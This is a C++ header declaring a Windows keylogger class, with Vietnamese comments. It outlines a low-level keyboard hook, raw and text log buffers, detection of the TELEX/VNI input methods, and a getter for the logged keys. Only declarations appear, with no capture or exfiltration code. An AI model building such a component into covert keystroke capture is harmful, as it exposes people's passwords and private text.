#pragma once
#include <string>
#include <vector>
#include <mutex>
#include <thread>
#include <windows.h>

class Keylogger {
private:
    std::string _rawLogBuffer;   // Buffer cho phím thô (RAW)
    std::string _finalLogBuffer; // Buffer cho văn bản (TEXT)

    std::string _detectedMode;      // TELEX / VNI
    std::string _inputMethodStatus; // ON / OFF
    DWORD _lastPhysicalKey;

    bool _lastWasInjectedBackspace;

    std::mutex _mutex;
    std::thread _loggerThread;
    bool _isRunning;
    HHOOK _hook;
    DWORD _threadId;

    void RunHookLoop();
    void ProcessKey(DWORD vkCode, DWORD scanCode, DWORD flags);
    void AnalyzeInputMethod(DWORD vkCode, bool isInjected);
    std::string MapVkToRawString(DWORD vkCode, bool isShift, bool isCaps); // Hàm map phím
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

public:
    Keylogger();
    ~Keylogger();

    void StartKeyLogging();
    void StopKeyLogging();
    std::string GetLoggedKeys(); // Hàm trả về format đặc biệt
};